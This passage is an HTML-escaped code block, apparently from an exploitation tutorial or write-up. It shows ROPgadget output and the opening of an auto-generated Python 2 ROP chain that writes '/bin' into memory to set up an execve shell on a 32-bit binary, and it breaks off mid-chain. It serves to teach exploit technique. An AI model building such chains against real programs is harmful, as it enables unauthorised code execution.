&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ROP&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chain&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;generation&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===========================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Step&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;what&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gadgets&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8051035&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dword&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;edi&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;esi&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;edi&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8048433&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;esi&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8048480&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;edi&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Can&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find the &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;edi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;edi&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; gadget. Try with another &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80549db&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dword&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x806f02a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;edx&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80b81c6&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8049303&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Step&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Init&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syscall&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;number&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gadgets&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8049303&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x807a86f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inc&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Step&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Init&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syscall&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gadgets&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80481c9&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80de955&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x806f02a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;edx&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Step&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Syscall&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gadget&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gadget&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x806cc25&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Step&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Build&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ROP&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;c1&#34;&gt;#!/usr/bin/env python2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;c1&#34;&gt;# execve generated by ROPgadget&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;c1&#34;&gt;# Padding goes here&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea060&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080b81c6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080549db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# mov dword ptr [edx], eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
